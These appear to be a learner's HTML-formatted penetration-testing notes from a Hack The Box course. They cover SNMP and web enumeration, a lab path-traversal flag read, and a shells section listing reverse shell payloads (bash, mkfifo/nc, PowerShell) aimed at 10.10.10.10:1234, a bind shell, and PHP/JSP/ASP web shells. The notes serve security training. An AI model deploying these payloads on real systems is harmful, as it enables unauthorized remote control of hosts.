      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Cut character&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dw&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Cut word&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dd&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Cut full line&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yw&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Copy word&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yy&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Copy full line&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Paste&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;There are many commands available to us. The following are some of them:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:1&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Go to line number 1.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:w&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Write the file, save&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:q&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Quit&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:q!&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Quit without saving&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:wq&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Write and quit&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;p&gt;#Service #snmp #snmpwalk #onesixtyone&lt;/p&gt;
&lt;h4 id=&quot;snmp&quot;&gt;SNMP&lt;/h4&gt;

&lt;p&gt;SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;public&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;private&lt;/code&gt; are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.&lt;/p&gt;

&lt;p&gt;Service Scanning&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snmpwalk &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 2c &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public &amp;lt;ip&amp;gt; 
snmpwalk &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 2c &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; private  &amp;lt;ip&amp;gt;
onesixtyone &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /home/nullbyte/SecLists/snmp_dict.txt 10.129.42.254
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h1&gt;

&lt;p&gt;#DirectoryEnumeration #fuzz #webcontent #webapp&lt;/p&gt;

&lt;p&gt;When performing service scanning, we will often run into web servers running on ports 80 and 443. Webservers host web applications (sometimes more than 1) which often provide a considerable attack surface and a very high-value target during a penetration test. Proper web enumeration is critical, especially when an organization is not exposing many services or those services are appropriately patched.&lt;/p&gt;

&lt;h2 id=&quot;gobuster&quot;&gt;Gobuster&lt;/h2&gt;

&lt;p&gt;After discovering a web application, it is always worth checking to see if we can uncover any hidden files or directories on the webserver that are not intended for public access. We can use a tool such as &lt;a href=&quot;https://github.com/ffuf/ffuf&quot;&gt;ffuf&lt;/a&gt; or &lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;GoBuster&lt;/a&gt; to perform this directory enumeration. Sometimes we will find hidden functionality or pages/directories exposing sensitive data that can be leveraged to access the web application or even remote code execution on the web server itself.&lt;/p&gt;

&lt;p&gt;GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing. The tool has additional functionality, such as enumeration of public AWS S3 buckets. For this module’s purposes, we are interested in the directory (and file) brute-forcing modes specified with the switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir&lt;/code&gt;. Let us run a simple scan using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirb&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;common.txt&lt;/code&gt; wordlist.&lt;/p&gt;

&lt;p&gt;nb: Seclist can be installed with &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt install seclists -y&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; IP &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /home/nullbyte/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://10.10.10.121/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2020/12/11 21:47:25 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/.hta &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/.htpasswd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/.htaccess &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/wordpress &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;#bannergrabing  #whatweb&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-IL&lt;/span&gt; https://www.example.com

HTTP/1.1 200 OK
Date: Fri, 18 Dec 2024 22:24:05 GMT
Server: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  OUT WE EXPECT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;public-exploits&quot;&gt;Public Exploits&lt;/h1&gt;

&lt;p&gt;Once we identify the services running on ports identified from our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;// Finding Public Exploits&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Many tools&lt;/strong&gt; can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to &lt;strong&gt;Google&lt;/strong&gt; for the application name with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt; to see if we get any results:&lt;/p&gt;

&lt;p&gt;![[google_smb.jpg]]&lt;/p&gt;

&lt;p&gt;A well-known tool for this purpose is &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;&lt;/strong&gt;, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command&lt;/p&gt;

&lt;p&gt;Example of the HTB was to find a particular &lt;strong&gt;SimpleBackup&lt;/strong&gt; file read in a &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wordpress&lt;/code&gt;&lt;/strong&gt; plugin and the exploit worked with payload /flag.txt&lt;/p&gt;

&lt;p&gt;https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://94.237.55.96:40307/wp-admin/tools.php?page=backup_manager&amp;amp;download_backup_file=../../../../../flag.txt&apos;&lt;/span&gt;     
HTB&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;my_f1r57_h4ck&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;types-of-shells&quot;&gt;Types of Shells&lt;/h1&gt;

&lt;p&gt;Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system’s shell, i.e., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bash&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerShell&lt;/code&gt;, so we can thoroughly investigate the remote system for our next move.&lt;/p&gt;

&lt;p&gt;One way to connect to a compromised system is through network protocols, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; for Linux or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt; for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.&lt;/p&gt;

&lt;p&gt;The other method of accessing a compromised host for control and remote code execution is through shells.&lt;br /&gt;
As previously discussed, there are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each of these shells has a different method of communication with us for accepting and executing our commands.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Type of Shell&lt;/th&gt;
      &lt;th&gt;Method of Communication&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Reverse Shell&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Connects back to our system and gives us control through a reverse connection.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bind Shell&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Waits for us to connect to it and gives us control once we do.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Web Shell&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Let us dive more deeply into each of the above shells and walk through examples of each.&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;

&lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Reverse Shell&lt;/code&gt; is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt; listener on our machine that listens on a specific port, say port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1234&lt;/code&gt;. With this listener in place, we can execute a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell command&lt;/code&gt; that connects the remote systems shell, i.e., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bash&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerShell&lt;/code&gt; to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt; listener, which gives us a reverse connection over the remote system.&lt;/p&gt;

&lt;h3 id=&quot;possible-payloads&quot;&gt;Possible payloads&lt;/h3&gt;

&lt;p&gt;#reverseshell #payloadrs #shell&lt;/p&gt;

&lt;p&gt;simple bash:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/1234 0&amp;gt;&amp;amp;1&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;mkfifo bash:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.10.10 1234 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;mkfifo bind shell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;powershell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
powershell &lt;span class=&quot;nt&quot;&gt;-nop&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = New-Object System.Net.Sockets.TCPClient(&apos;10.10.10.10&apos;,1234);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.GetStream();[byte[]]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = 0..65535|%{0};while((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.Read(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, 0, &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.Length)) -ne 0){;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,0, &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sb&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = (iex &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 2&amp;gt;&amp;amp;1 | Out-String );&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sb2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sb&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; + &apos;PS &apos; + (pwd).Path + &apos;&amp;gt; &apos;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sbt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = ([text.encoding]::ASCII).GetBytes(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sb2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.Write(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sbt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,0,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sbt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.Length);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.Flush()};&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.Close()&quot;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spanw in extra env :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After we run this command, we will hit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl+z&lt;/code&gt; to background our shell and get back on our local terminal, and input the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stty&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@remotehost&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;^Z

c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fg&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Enter]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Enter]
www-data@remotehost&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;writing-a-web-shell&quot;&gt;Writing a Web Shell&lt;/h4&gt;

&lt;p&gt;First of all, we need to write our web shell that would take our command through a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:&lt;/p&gt;

&lt;p&gt;Code: php&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Code: jsp&lt;/p&gt;

&lt;div class=&quot;language-jsp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;%&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;%&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Code: asp&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asp&quot;&gt;&amp;lt;% eval request(&quot;cmd&quot;) %&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;uploading-a-web-shell&quot;&gt;Uploading a Web Shell&lt;/h4&gt;

&lt;p&gt;Once we have our web shell, we need to place our web shell script into the remote host’s web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.php&lt;/code&gt; and upload it, and then access our uploaded file to execute commands.&lt;/p&gt;

&lt;p&gt;However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Web Server&lt;/th&gt;
      &lt;th&gt;Default Webroot&lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;/var/www/html/&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nginx&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;/usr/local/nginx/html/&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;c:\inetpub\wwwroot|&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XAMPP&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;C:\xampp\htdocs|&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;We can check these directories to see which webroot is in use and then use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHP&lt;/code&gt; shell with the following command:&lt;/p&gt;

&lt;p&gt;Code: bash&lt;/p&gt;

